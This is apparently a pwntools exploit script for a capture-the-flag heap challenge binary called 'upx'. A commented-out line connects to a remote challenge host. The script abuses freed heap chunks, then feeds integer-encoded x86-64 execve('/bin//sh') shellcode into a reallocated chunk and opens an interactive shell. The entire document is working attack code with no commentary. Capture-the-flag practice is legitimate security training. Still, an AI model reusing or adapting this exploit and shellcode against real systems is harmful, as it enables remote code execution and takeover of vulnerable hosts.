from pwn import *

p = process('./upx')
#p = remote('34.92.121.149',10000)
elf = ELF('./upx')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'

def add(index,size,integer):
    p.sendlineafter('Your choice:','1')
    p.sendlineafter('Index:',str(index))
    p.sendlineafter('Size:',str(size))
    p.sendlineafter('integers, -1 to stop:',str(integer))
    p.sendline('-1')

def delete(index):
    p.sendlineafter('Your choice:','2')
    p.sendlineafter('vec index:',str(index))

def show(index):
    p.sendlineafter('Your choice:','4')
    p.sendlineafter('vec index:',str(index))

add(0,0x40/4,1)
add(1,0x20/4,2)
add(2,0x1000/4,3)
delete(1)
delete(0)
delete(2)
p.sendlineafter('Your choice:','1')
p.sendlineafter('Index:',str(3))
p.sendlineafter('Size:',str(0x68/4))

payload = '-'+str(0x47b79796)
p.sendlineafter('integers, -1 to stop:',payload)
p.sendline(str(0x6e69622f))
p.sendline(str(0x732f2f2f))
p.sendline('-'+str(0x1876b7b0))
p.sendline(str(0x01697268))
p.sendline(str(0x24348101))
p.sendline(str(0x01010101))
p.sendline(str(0x6a56f631))
p.sendline(str(0x01485e08))
p.sendline('-'+str(0x76b7a91a))
p.sendline(str(0x6ad231e6))
p.sendline(str(0x050f583b))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(1))
p.sendline(str(40683))
p.sendline(str(-1))

#gdb.attach(p)

show(1)

p.interactive()
